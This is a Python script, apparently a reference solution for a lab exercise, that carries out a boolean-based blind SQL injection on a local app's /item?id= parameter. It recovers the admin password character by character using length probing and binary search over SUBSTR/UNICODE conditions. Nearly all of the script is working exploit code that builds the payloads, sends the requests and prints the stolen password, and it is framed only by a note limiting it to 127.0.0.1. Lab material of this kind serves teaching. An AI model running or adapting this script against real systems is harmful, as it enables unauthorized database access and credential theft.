#!/usr/bin/env python3
"""
참고 풀이: /item?id= 의 Boolean 기반 블라인드 SQLi로 admin 비밀번호 추출.
표준 라이브러리만 사용. 실습 환경(127.0.0.1:8080)에서만 동작한다.

사용법: python3 solve_blind.py
"""
import urllib.parse
import urllib.request

BASE = "http://127.0.0.1:8080/item?id="
TRUE_MARK = "Found:"


def is_true(condition: str) -> bool:
    payload = f"1 AND ({condition})"
    url = BASE + urllib.parse.quote(payload, safe="")
    with urllib.request.urlopen(url, timeout=5) as resp:
        return TRUE_MARK in resp.read().decode()


def query_length() -> int:
    n = 1
    while not is_true(f"(SELECT LENGTH(password) FROM users WHERE username='admin')={n}"):
        n += 1
        if n > 64:
            raise RuntimeError("길이를 찾지 못했다. 앱이 떠 있는지, 또는 이미 파라미터화로 고쳐진 앱인지 확인하라.")
    return n


def extract(length: int) -> str:
    result = ""
    for pos in range(1, length + 1):
        lo, hi = 32, 126  # 출력 가능한 ASCII 범위에서 이진 탐색
        while lo < hi:
            mid = (lo + hi) // 2
            cond = f"UNICODE(SUBSTR((SELECT password FROM users WHERE username='admin'),{pos},1))>{mid}"
            if is_true(cond):
                lo = mid + 1
            else:
                hi = mid
        result += chr(lo)
        print(f"\r[{pos}/{length}] {result}", end="", flush=True)
    print()
    return result


if __name__ == "__main__":
    n = query_length()
    print(f"비밀번호 길이: {n}")
    pw = extract(n)
    print(f"admin 비밀번호: {pw}")
    print("요청 횟수 ≈", n + n * 7, "(길이 탐색 + 글자당 이진탐색 약 7회)")
